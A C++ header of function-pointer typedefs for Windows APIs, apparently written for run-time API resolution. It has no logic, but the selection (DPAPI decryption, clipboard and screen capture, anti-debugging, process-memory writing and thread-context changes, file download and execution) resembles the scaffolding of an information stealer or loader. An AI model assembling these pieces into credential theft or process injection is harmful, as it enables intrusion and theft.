#pragma once
#include <Windows.h>
#include <WinInet.h>
#include <bcrypt.h>
#include <gdiplus.h>
#include <WinSock2.h>
#define SECURITY_WIN32
#include <sspi.h>

using namespace Gdiplus;

typedef HMODULE(WINAPI *PROTO_GetModuleHandleA)(
	LPCSTR lpModuleName
	);

typedef BOOL(WINAPI *PROTO_SetEndOfFile)(
	HANDLE hFile
	);

typedef BOOL(WINAPI *PROTO_VirtualProtect)(
	_In_  LPVOID lpAddress,
	_In_  SIZE_T dwSize,
	_In_  DWORD  flNewProtect,
	_Out_ PDWORD lpflOldProtect
	);

typedef NTSTATUS(NTAPI *PROTO_NtSetInformationThread)(
	_In_ HANDLE ThreadHandle,
	_In_ ULONG  ThreadInformationClass,
	_In_ PVOID  ThreadInformation,
	_In_ ULONG  ThreadInformationLength
	);

typedef HANDLE(WINAPI *PROTO_FindFirstFileA)(
	__in LPCSTR lpFileName,
	__out LPWIN32_FIND_DATAA lpFindFileData
	);

typedef BOOL(WINAPI *PROTO_FindNextFileA)(
	__in HANDLE hFindFile,
	__out LPWIN32_FIND_DATAA lpFindFileData
	);

typedef BOOL(WINAPI *PROTO_FindClose)(
	_Inout_ HANDLE hFindFile
	);

typedef BOOL(WINAPI *PROTO_SetFileAttributesA)(
	LPCSTR lpFileName,
	DWORD  dwFileAttributes
	);

typedef BOOL(WINAPI *PROTO_CopyFileA)(
	LPCTSTR lpExistingFileName,
	LPCTSTR lpNewFileName,
	BOOL    bFailIfExists
	);

typedef DWORD(WINAPI *PROTO_GetFileAttributesA)(
	LPCSTR lpFileName
	);

typedef BOOL(WINAPI *PROTO_CreateDirectoryA)(
	LPCSTR lpPathName,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes
	);

typedef BOOL(WINAPI *PROTO_DeleteFileA)(
	LPCSTR lpFileName
	);

typedef BOOL(WINAPI *PROTO_RemoveDirectoryA)(
	LPCSTR lpPathName
	);

typedef DWORD(WINAPI *PROTO_GetModuleFileNameA)(
	_In_opt_ HMODULE hModule,
	_Out_    LPTSTR  lpFilename,
	_In_     DWORD   nSize
	);

typedef DPAPI_IMP BOOL(WINAPI *PROTO_CryptUnprotectData)(
	DATA_BLOB                 *pDataIn,
	LPWSTR                    *ppszDataDescr,
	DATA_BLOB                 *pOptionalEntropy,
	PVOID                     pvReserved,
	CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
	DWORD                     dwFlags,
	DATA_BLOB                 *pDataOut
	);

typedef LSTATUS(WINAPI *PROTO_RegQueryValueExA)(
	HKEY							  hKey,
	LPCSTR                            lpValueName,
	LPDWORD                           lpReserved,
	LPDWORD                           lpType,
	__out_data_source(REGISTRY)LPBYTE lpData,
	LPDWORD                           lpcbData
	);

typedef int(WINAPI *PROTO_GetObjectA)(
	HANDLE h,
	int    c,
	LPVOID pv
	);

typedef HLOCAL(WINAPI *PROTO_LocalAlloc)(
	UINT   uFlags,
	SIZE_T uBytes
	);

typedef HGLOBAL(WINAPI *PROTO_GlobalAlloc)(
	UINT   uFlags,
	SIZE_T dwBytes
	);

typedef int(WINAPI *PROTO_GetDIBits)(
	HDC          hdc,
	HBITMAP      hbm,
	UINT         start,
	UINT         cLines,
	LPVOID       lpvBits,
	LPBITMAPINFO lpbmi,
	UINT         usage
	);

typedef HANDLE(WINAPI *PROTO_CreateFileA)(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);

typedef BOOL(WINAPI *PROTO_WriteFile)(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
	);

typedef BOOL(WINAPI *PROTO_CloseHandle)(
	_In_ HANDLE hObject
	);

typedef HGLOBAL(WINAPI *PROTO_GlobalFree)(
	_Frees_ptr_opt_ HGLOBAL hMem
	);

typedef LSTATUS(WINAPI *PROTO_RegOpenKeyA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	PHKEY  phkResult
	);

typedef BOOL(WINAPI *PROTO_EnumDisplayDevicesA)(
	LPCSTR           lpDevice,
	DWORD            iDevNum,
	PDISPLAY_DEVICEA lpDisplayDevice,
	DWORD            dwFlags
	);

typedef int(WINAPI *PROTO_GetSystemMetrics)(
	_In_ int nIndex
	);

typedef HDC(WINAPI *PROTO_GetDC)(
	HWND hWnd
	);

typedef HWND(WINAPI *PROTO_GetDesktopWindow)(
	void
	);

typedef HDC(WINAPI *PROTO_CreateCompatibleDC)(
	HDC hdc
	);

typedef HBITMAP(WINAPI *PROTO_CreateCompatibleBitmap)(
	HDC hdc,
	int cx,
	int cy
	);

typedef HGDIOBJ(WINAPI *PROTO_SelectObject)(
	HDC     hdc,
	HGDIOBJ h
	);

typedef HBRUSH(WINAPI *PROTO_CreateBrushIndirect)(
	CONST LOGBRUSH *plbrush
	);

typedef int(WINAPI *PROTO_FillRect)(
	HDC        hDC,
	CONST RECT *lprc,
	HBRUSH     hbr
	);

typedef BOOL(WINAPI *PROTO_BitBlt)(
	HDC   hdc,
	int   x,
	int   y,
	int   cx,
	int   cy,
	HDC   hdcSrc,
	int   x1,
	int   y1,
	DWORD rop
	);

typedef BOOL(WINAPI *PROTO_GetVolumeInformationA)(
	LPCSTR  lpRootPathName,
	LPSTR   lpVolumeNameBuffer,
	DWORD   nVolumeNameSize,
	LPDWORD lpVolumeSerialNumber,
	LPDWORD lpMaximumComponentLength,
	LPDWORD lpFileSystemFlags,
	LPSTR   lpFileSystemNameBuffer,
	DWORD   nFileSystemNameSize
	);

typedef DWORD(WINAPI *PROTO_GetTickCount)(
	void
	);

typedef HANDLE(WINAPI *PROTO_CreateFileMappingA)(
	HANDLE                hFile,
	LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
	DWORD                 flProtect,
	DWORD                 dwMaximumSizeHigh,
	DWORD                 dwMaximumSizeLow,
	LPCSTR                lpName
	);

typedef LPVOID(WINAPI *PROTO_MapViewOfFile)(
	_In_ HANDLE hFileMappingObject,
	_In_ DWORD  dwDesiredAccess,
	_In_ DWORD  dwFileOffsetHigh,
	_In_ DWORD  dwFileOffsetLow,
	_In_ SIZE_T dwNumberOfBytesToMap
	);

typedef BOOL(WINAPI *PROTO_ReadFile)(
	HANDLE                        hFile,
	__out_data_source(FILE)LPVOID lpBuffer,
	DWORD                         nNumberOfBytesToRead,
	LPDWORD                       lpNumberOfBytesRead,
	LPOVERLAPPED                  lpOverlapped
	);

typedef DWORD(WINAPI *PROTO_SetFilePointer)(
	HANDLE hFile,
	LONG   lDistanceToMove,
	PLONG  lpDistanceToMoveHigh,
	DWORD  dwMoveMethod
	);

typedef BOOL(WINAPI *PROTO_GetFileInformationByHandle)(
	HANDLE					     hFile,
	LPBY_HANDLE_FILE_INFORMATION lpFileInformation
	);

typedef HANDLE(WINAPI *PROTO_GetCurrentProcess)(
	void
	);

typedef DWORD(WINAPI *PROTO_GetFileSize)(
	HANDLE  hFile,
	LPDWORD lpFileSizeHigh
	);

typedef BOOL(WINAPI *PROTO_OpenClipboard)(
	HWND hWndNewOwner
	);

typedef BOOL(WINAPI *PROTO_IsClipboardFormatAvailable)(
	UINT format
	);

typedef BOOL(WINAPI *PROTO_CloseClipboard)(
	void
	);

typedef HANDLE(WINAPI *PROTO_GetClipboardData)(
	UINT uFormat
	);

typedef BOOL(WINAPI *PROTO_VirtualProtect)(
	_In_  LPVOID lpAddress,
	_In_  SIZE_T dwSize,
	_In_  DWORD  flNewProtect,
	_Out_ PDWORD lpflOldProtect
	);

typedef BOOL(WINAPI *PROTO_GetWindowRect)(
	_In_  HWND   hWnd,
	_Out_ LPRECT lpRect
	);

typedef HDC(WINAPI *PROTO_GetWindowDC)(
	HWND hWnd
	);

typedef int(WINAPI *PROTO_GetDeviceCaps)(
	HDC hdc,
	int index
	);

typedef HBITMAP(WINAPI* PROTO_CreateDIBSection)(
	HDC              hdc,
	CONST BITMAPINFO *pbmi,
	UINT             usage,
	VOID             **ppvBits,
	HANDLE           hSection,
	DWORD            offset
	);

typedef BOOL(WINAPI *PROTO_DeleteDC)(
	HDC hdc
	);

typedef int(WINAPI *PROTO_SaveDC)(
	HDC hdc
	);

typedef BOOL(WINAPI *PROTO_RestoreDC)(
	HDC hdc,
	int nSavedDC
	);

typedef BOOL(WINAPI *PROTO_DeleteObject)(
	HGDIOBJ ho
	);

typedef BOOL(WINAPI *PROTO_GetSystemTimes)(
	_Out_opt_ LPFILETIME lpIdleTime,
	_Out_opt_ LPFILETIME lpKernelTime,
	_Out_opt_ LPFILETIME lpUserTime
	);

typedef void(WINAPI *PROTO_Sleep)(
	DWORD dwMilliseconds
	);

typedef LSTATUS(WINAPI *PROTO_RegCloseKey)(
	HKEY hKey
	);

typedef BOOL(WINAPI *PROTO_GlobalMemoryStatusEx)(
	_Inout_ LPMEMORYSTATUSEX lpBuffer
	);

typedef BOOL(WINAPI *PROTO_IsWow64Process)(
	HANDLE hProcess,
	PBOOL  Wow64Process
	);

typedef BOOL(WINAPI *PROTO_GetFileAttributesExA)(
	LPCSTR                 lpFileName,
	GET_FILEEX_INFO_LEVELS fInfoLevelId,
	LPVOID                 lpFileInformation
	);

typedef	HRESULT(WINAPI *PROTO_URLDownloadToFileA)(
	LPUNKNOWN            pCaller,
	LPCTSTR              szURL,
	LPCTSTR              szFileName,
	_Reserved_ DWORD                dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB
	);

typedef HINSTANCE(WINAPI *PROTO_ShellExecuteA)(
	HWND   hwnd,
	LPCSTR lpOperation,
	LPCSTR lpFile,
	LPCSTR lpParameters,
	LPCSTR lpDirectory,
	INT    nShowCmd
	);

typedef HANDLE(WINAPI *PROTO_CreateMutexA)(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
	BOOL                  bInitialOwner,
	LPCSTR                lpName
	);

typedef DWORD(WINAPI *PROTO_WaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
	);

typedef BOOL(WINAPI *PROTO_ReleaseMutex)(
	HANDLE hMutex
	);

typedef UINT(WINAPI *PROTO_WinExec)(
	LPCSTR lpCmdLine,
	UINT   uCmdShow
	);

typedef HRESULT(WINAPI *PROTO_CoInitializeEx)(
	LPVOID pvReserved,
	DWORD  dwCoInit
	);

typedef HRESULT(WINAPI *PROTO_CoCreateInstance)(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID    *ppv
	);

typedef void(WINAPI *PROTO_VariantInit)(
	_Out_ VARIANTARG *pvarg
	);

typedef HRESULT(WINAPI *PROTO_VariantClear)(
	VARIANTARG *pvarg
	);

typedef void(WINAPI *PROTO_CoTaskMemFree)(
	_Frees_ptr_opt_ LPVOID pv
	);

typedef BOOL(WINAPI *PROTO_CheckRemoteDebuggerPresent)(
	_In_    HANDLE hProcess,
	_Inout_ PBOOL  pbDebuggerPresent
	);

typedef BOOL(WINAPI *PROTO_GetThreadContext)(
	HANDLE    hThread,
	LPCONTEXT lpContext
	);

typedef HANDLE(WINAPI *PROTO_GetCurrentThread)(
	void
	);

typedef void(WINAPI *PROTO_GetSystemInfo)(
	LPSYSTEM_INFO lpSystemInfo
	);

typedef LPVOID(WINAPI *PROTO_VirtualAlloc)(
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD  flAllocationType,
	_In_     DWORD  flProtect
	);

typedef BOOL(WINAPI *PROTO_VirtualFree)(
	_In_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD  dwFreeType
	);

typedef void(WINAPI *PROTO_CoUninitialize)(
	void
	);

typedef NTSTATUS(WINAPI *PROTO_NtQueryInformationProcess)(
	HANDLE, UINT, PVOID, ULONG, PULONG
	);

typedef void(WINAPI *PROTO_GdiplusShutdown)(
	ULONG_PTR token
	);

typedef Status(WINAPI *PROTO_GdiplusStartup)(
	OUT ULONG_PTR             *token,
	const GdiplusStartupInput *input,
	OUT GdiplusStartupOutput  *output
	);

typedef HANDLE(WINAPI *PROTO_CreateTransaction)(
	IN LPSECURITY_ATTRIBUTES lpTransactionAttributes,
	IN LPGUID                UOW,
	IN DWORD                 CreateOptions,
	IN DWORD                 IsolationLevel,
	IN DWORD                 IsolationFlags,
	IN DWORD                 Timeout,
	LPWSTR                   Description
	);

typedef BOOL(WINAPI *PROTO_CommitTransaction)(
	IN HANDLE TransactionHandle
	);

typedef BOOL(WINAPI *PROTO_DeleteFileTransactedA)(
	LPCSTR lpFileName,
	HANDLE hTransaction
	);

typedef BOOL(WINAPI *PROTO_RemoveDirectoryTransactedA)(
	LPCSTR lpPathName,
	HANDLE hTransaction
	);

typedef BOOL(WINAPI *PROTO_CreateDirectoryTransactedA)(
	LPCSTR                lpTemplateDirectory,
	LPCSTR                lpNewDirectory,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	HANDLE                hTransaction
	);

typedef BOOL(WINAPI *PROTO_CopyFileTransactedA)(
	LPCSTR             lpExistingFileName,
	LPCSTR             lpNewFileName,
	LPPROGRESS_ROUTINE lpProgressRoutine,
	LPVOID             lpData,
	LPBOOL             pbCancel,
	DWORD              dwCopyFlags,
	HANDLE             hTransaction
	);

typedef BOOL(WINAPI *PROTO_UnmapViewOfFile)(
	_In_ LPCVOID lpBaseAddress
	);

typedef BOOL(WINAPI *PROTO_SystemTimeToFileTime)(
	const SYSTEMTIME *lpSystemTime,
	LPFILETIME       lpFileTime
	);

typedef void(WINAPI *PROTO_GetLocalTime)(
	LPSYSTEMTIME lpSystemTime
	);

typedef BOOL(WINAPI *PROTO_RollbackTransaction)(
	IN HANDLE TransactionHandle
	);

typedef int(WINAPI *PROTO_MessageBoxA)(
	HWND    hWnd,
	LPCTSTR lpText,
	LPCTSTR lpCaption,
	UINT    uType
	);

typedef HINTERNET(WINAPI *PROTO_InternetConnectA)(
	_In_ HINTERNET hInternet,
	_In_ LPCSTR lpszServerName,
	_In_ INTERNET_PORT nServerPort,
	_In_opt_ LPCSTR lpszUserName,
	_In_opt_ LPCSTR lpszPassword,
	_In_ DWORD dwService,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
	);

typedef HINTERNET(WINAPI *PROTO_InternetOpenA)(
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
	);

typedef HINTERNET(WINAPI *PROTO_HttpOpenRequestA)(
	_In_ HINTERNET hConnect,
	_In_opt_ LPCSTR lpszVerb,
	_In_opt_ LPCSTR lpszObjectName,
	_In_opt_ LPCSTR lpszVersion,
	_In_opt_ LPCSTR lpszReferrer,
	_In_opt_z_ LPCSTR FAR * lplpszAcceptTypes,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
	);

typedef BOOL(WINAPI *PROTO_HttpSendRequestA)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
	);

typedef BOOL(WINAPI *PROTO_InternetReadFile)(
	HINTERNET hFile,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
	);

typedef BOOL(WINAPI *PROTO_InternetCloseHandle)(
	HINTERNET hInternet
	);

typedef BOOL(WINAPI *PROTO_SetCurrentDirectoryA)(
	LPCTSTR lpPathName
	);

typedef int(WINAPI *PROTO_GetUserDefaultLocaleName)(
	LPWSTR lpLocaleName,
	int    cchLocaleName
	);

typedef BOOL(WINAPI *PROTO_CryptStringToBinaryA)(
	LPCSTR pszString,
	DWORD  cchString,
	DWORD  dwFlags,
	BYTE   *pbBinary,
	DWORD  *pcbBinary,
	DWORD  *pdwSkip,
	DWORD  *pdwFlags
	);

typedef BOOL(WINAPI *PROTO_DeleteUrlCacheEntryA)(
	LPCSTR lpszUrlName
	);

typedef LSTATUS(WINAPI *PROTO_RegEnumValueA)(
	HKEY    hKey,
	DWORD   dwIndex,
	LPSTR   lpValueName,
	LPDWORD lpcchValueName,
	LPDWORD lpReserved,
	LPDWORD lpType,
	LPBYTE  lpData,
	LPDWORD lpcbData
	);

typedef LSTATUS(WINAPI *PROTO_RegQueryInfoKeyA)(
	HKEY      hKey,
	LPSTR     lpClass,
	LPDWORD   lpcchClass,
	LPDWORD   lpReserved,
	LPDWORD   lpcSubKeys,
	LPDWORD   lpcbMaxSubKeyLen,
	LPDWORD   lpcbMaxClassLen,
	LPDWORD   lpcValues,
	LPDWORD   lpcbMaxValueNameLen,
	LPDWORD   lpcbMaxValueLen,
	LPDWORD   lpcbSecurityDescriptor,
	PFILETIME lpftLastWriteTime
	);

typedef LSTATUS(WINAPI *PROTO_RegEnumKeyExA)(
	HKEY      hKey,
	DWORD     dwIndex,
	LPSTR     lpName,
	LPDWORD   lpcchName,
	LPDWORD   lpReserved,
	LPSTR     lpClass,
	LPDWORD   lpcchClass,
	PFILETIME lpftLastWriteTime
	);

typedef int(WINAPI *PROTO_GetKeyboardLayoutList)(
	int nBuff,
	HKL *lpList
	);

typedef int(WINAPI *PROTO_GetLocaleInfoA)(
	LCID   Locale,
	LCTYPE LCType,
	LPSTR  lpLCData,
	int    cchData
	);

typedef HLOCAL(WINAPI *PROTO_LocalFree)(
	_Frees_ptr_opt_ HLOCAL hMem
	);

typedef HRESULT(WINAPI *PROTO_CoInitialize)(
	LPVOID pvReserved
	);

typedef BOOL(WINAPI *PROTO_InternetSetOptionA)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	DWORD     dwBufferLength
	);

typedef LSTATUS(WINAPI *PROTO_RegEnumKeyA)(
	HKEY  hKey,
	DWORD dwIndex,
	LPSTR lpName,
	DWORD cchName
	);

typedef void(WINAPI *PROTO_GetSystemTime)(
	LPSYSTEMTIME lpSystemTime
	);

typedef BOOL(WINAPI *PROTO_TzSpecificLocalTimeToSystemTime)(
	const TIME_ZONE_INFORMATION *lpTimeZoneInformation,
	const SYSTEMTIME            *lpLocalTime,
	LPSYSTEMTIME                lpUniversalTime
	);

typedef HRESULT(WINAPI *PROTO_URLOpenBlockingStreamA)(
	LPUNKNOWN            pCaller,
	LPCSTR               szURL,
	LPSTREAM            *ppStream,
	_Reserved_ DWORD     dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB
	);

typedef BOOL(WINAPI *PROTO_VirtualFreeEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  dwFreeType
	);

typedef LPCSTR(WINAPI *PROTO_PathFindFileNameA)(
	LPCSTR pszPath
	);

typedef UINT(WINAPI *PROTO_GetSystemDirectoryW)(
	LPWSTR lpBuffer,
	UINT   uSize
	);

typedef int(WINAPI *PROTO_SHAnsiToUnicode)(
	PCSTR pszSrc,
	PWSTR pwszDst,
	int   cwchBuf
	);

typedef HANDLE(WINAPI *PROTO_GetProcessHeap)(
	void
	);

typedef LPVOID(WINAPI *PROTO_VirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef HANDLE(WINAPI *PROTO_CreateFileW)(
	LPCWSTR               lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);

typedef LONG(WINAPI *PROTO_WinVerifyTrust)(
	HWND   hwnd,
	GUID   *pgActionID,
	LPVOID pWVTData
	);

typedef PIMAGE_NT_HEADERS(WINAPI *PROTO_ImageNtHeader)(
	PVOID Base
	);

typedef PVOID(WINAPI *PROTO_AddVectoredExceptionHandler)(
	_In_ ULONG                       FirstHandler,
	_In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
	);

typedef ULONG(WINAPI *PROTO_RemoveVectoredExceptionHandler)(
	_In_ PVOID Handler
	);

typedef UINT(WINAPI *PROTO_GetSystemDirectoryA)(
	LPSTR lpBuffer,
	UINT  uSize
	);

typedef HANDLE(WINAPI *PROTO_CreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);

typedef LANGID(WINAPI *PROTO_GetUserDefaultLangID)(
	void
	);

typedef HRESULT(WINAPI *PROTO_CreateStreamOnHGlobal)(
	HGLOBAL  hGlobal,
	BOOL     fDeleteOnRelease,
	LPSTREAM *ppstm
	);

typedef void(WINAPI *PROTO_ExitProcess)(
	UINT uExitCode
	);

typedef DWORD(WINAPI *PROTO_GetLastError)(
	void
	);

typedef BOOL(WINAPI *PROTO_IsBadReadPtr)(
	const VOID *lp,
	UINT_PTR   ucb
	);

typedef BOOL(WINAPI *PROTO_DuplicateHandle)(
	HANDLE hSourceProcessHandle,
	HANDLE hSourceHandle,
	HANDLE hTargetProcessHandle,
	LPHANDLE lpTargetHandle, 
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	DWORD dwOptions
	);

typedef DWORD(WINAPI *PROTO_GetCurrentProcessId)(
	void
	);

typedef GpStatus(WINAPI *PROTO_GdipCreateBitmapFromHBITMAP)(
	HBITMAP hbm,
	HPALETTE hpal,
	GpBitmap** bitmap
	);

typedef GpStatus(WINAPI *PROTO_GdipGetImageEncodersSize)(
	_Out_ UINT *numEncoders,
	_Out_ _Out_range_(>= , (*numEncoders) * sizeof(ImageCodecInfo)) UINT *size
	);

typedef GpStatus(WINAPI *PROTO_GdipGetImageEncoders)(
	_In_ UINT numEncoders,
	_In_ UINT size,
	_Out_writes_bytes_(size) ImageCodecInfo *encoders
	);

typedef GpStatus(WINAPI *PROTO_GdipSaveImageToStream)(
	GpImage *image, IStream* stream,
	GDIPCONST CLSID* clsidEncoder,
	GDIPCONST EncoderParameters* encoderParams
	);

typedef GpStatus(WINAPI *PROTO_GdipDisposeImage)(
	GpImage *image
	);

typedef GpStatus(WINAPI *PROTO_GdipCloneImage)(
	GpImage *image, GpImage **cloneImage
	);

typedef void*(WINAPI *PROTO_GdipAlloc)(
	size_t size
	);

typedef void(WINAPI *PROTO_GdipFree)(
	void* ptr
	);

typedef BOOL(WINAPI *PROTO_GetVersionExA)(
	LPOSVERSIONINFOA lpVersionInformation
	);

typedef void(WINAPI *PROTO_OutputDebugStringA)(
	_In_opt_ LPCTSTR lpOutputString
	);

typedef BOOL(WINAPI *PROTO_CreateProcessA)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI *PROTO_ReadProcessMemory)(
	HANDLE  hProcess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesRead
	);

typedef BOOL(WINAPI *PROTO_WriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
	);

typedef BOOL(WINAPI *PROTO_SetThreadContext)(
	HANDLE        hThread,
	const CONTEXT *lpContext
	);

typedef DWORD(WINAPI *PROTO_ResumeThread)(
	HANDLE hThread
	);

typedef LSTATUS(WINAPI *PROTO_RegCreateKeyA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	PHKEY  phkResult
	);

typedef LSTATUS(WINAPI *PROTO_RegSetValueExA)(
	HKEY       hKey,
	LPCSTR     lpValueName,
	DWORD      Reserved,
	DWORD      dwType,
	const BYTE *lpData,
	DWORD      cbData
	);

typedef DWORD(WINAPI *PROTO_GetLogicalDrives)(
	void
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptSetProperty)(
	BCRYPT_HANDLE hObject,
	LPCWSTR       pszProperty,
	PUCHAR        pbInput,
	ULONG         cbInput,
	ULONG         dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptOpenAlgorithmProvider)(
	BCRYPT_ALG_HANDLE *phAlgorithm,
	LPCWSTR           pszAlgId,
	LPCWSTR           pszImplementation,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptCloseAlgorithmProvider)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptDestroyKey)(
	BCRYPT_KEY_HANDLE hKey
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptExportKey)(
	BCRYPT_KEY_HANDLE hKey,
	BCRYPT_KEY_HANDLE hExportKey,
	LPCWSTR           pszBlobType,
	PUCHAR            pbOutput,
	ULONG             cbOutput,
	ULONG             *pcbResult,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptSecretAgreement)(
	BCRYPT_KEY_HANDLE    hPrivKey,
	BCRYPT_KEY_HANDLE    hPubKey,
	BCRYPT_SECRET_HANDLE *phAgreedSecret,
	ULONG                dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptDeriveKey)(
	BCRYPT_SECRET_HANDLE hSharedSecret,
	LPCWSTR              pwszKDF,
	BCryptBufferDesc     *pParameterList,
	PUCHAR               pbDerivedKey,
	ULONG                cbDerivedKey,
	ULONG                *pcbResult,
	ULONG                dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptDestroySecret)(
	BCRYPT_SECRET_HANDLE hSecret
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptImportKey)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	BCRYPT_KEY_HANDLE hImportKey,
	LPCWSTR           pszBlobType,
	BCRYPT_KEY_HANDLE *phKey,
	PUCHAR            pbKeyObject,
	ULONG             cbKeyObject,
	PUCHAR            pbInput,
	ULONG             cbInput,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptImportKeyPair)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	BCRYPT_KEY_HANDLE hImportKey,
	LPCWSTR           pszBlobType,
	BCRYPT_KEY_HANDLE *phKey,
	PUCHAR            pbInput,
	ULONG             cbInput,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptGenRandom)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	PUCHAR            pbBuffer,
	ULONG             cbBuffer,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptFinishHash)(
	BCRYPT_HASH_HANDLE hHash,
	PUCHAR             pbOutput,
	ULONG              cbOutput,
	ULONG              dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptDestroyHash)(
	BCRYPT_HASH_HANDLE hHash
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptHashData)(
	BCRYPT_HASH_HANDLE hHash,
	PUCHAR             pbInput,
	ULONG              cbInput,
	ULONG              dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptCreateHash)(
	BCRYPT_ALG_HANDLE  hAlgorithm,
	BCRYPT_HASH_HANDLE *phHash,
	PUCHAR             pbHashObject,
	ULONG              cbHashObject,
	PUCHAR             pbSecret,
	ULONG              cbSecret,
	ULONG              dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptEncrypt)(
	BCRYPT_KEY_HANDLE hKey,
	PUCHAR            pbInput,
	ULONG             cbInput,
	VOID              *pPaddingInfo,
	PUCHAR            pbIV,
	ULONG             cbIV,
	PUCHAR            pbOutput,
	ULONG             cbOutput,
	ULONG             *pcbResult,
	ULONG             dwFlags
	);

typedef NTSTATUS(WINAPI *PROTO_BCryptDuplicateHash)(
	BCRYPT_HASH_HANDLE hHash,
	BCRYPT_HASH_HANDLE *phNewHash,
	PUCHAR             pbHashObject,
	ULONG              cbHashObject,
	ULONG              dwFlags
	);

typedef BOOL(WINAPI *PROTO_CryptReleaseContext)(
	HCRYPTPROV hProv,
	DWORD      dwFlags
	);

typedef BOOL(WINAPI *PROTO_CryptAcquireContextA)(
	HCRYPTPROV *phProv,
	LPCSTR     szContainer,
	LPCSTR     szProvider,
	DWORD      dwProvType,
	DWORD      dwFlags
	);

typedef BOOL(WINAPI *PROTO_CryptGenRandom)(
	HCRYPTPROV hProv,
	DWORD      dwLen,
	BYTE       *pbBuffer
	);

typedef BOOL(WINAPI *PROTO_CryptBinaryToStringA)(
	const BYTE *pbBinary,
	DWORD      cbBinary,
	DWORD      dwFlags,
	LPSTR      pszString,
	DWORD      *pcchString
	);

typedef PSecurityFunctionTableA(WINAPI *PROTO_InitSecurityInterfaceA)(
	void
	);

typedef BOOL(WINAPI *PROTO_CryptDecodeObject)(
	DWORD      dwCertEncodingType,
	LPCSTR     lpszStructType,
	const BYTE *pbEncoded,
	DWORD      cbEncoded,
	DWORD      dwFlags,
	void       *pvStructInfo,
	DWORD      *pcbStructInfo
	);

typedef BOOL(WINAPI *PROTO_FileTimeToSystemTime)(
	const FILETIME *lpFileTime,
	LPSYSTEMTIME   lpSystemTime
	);

typedef BOOL(WINAPI *PROTO_FlushFileBuffers)(
	HANDLE hFile
	);

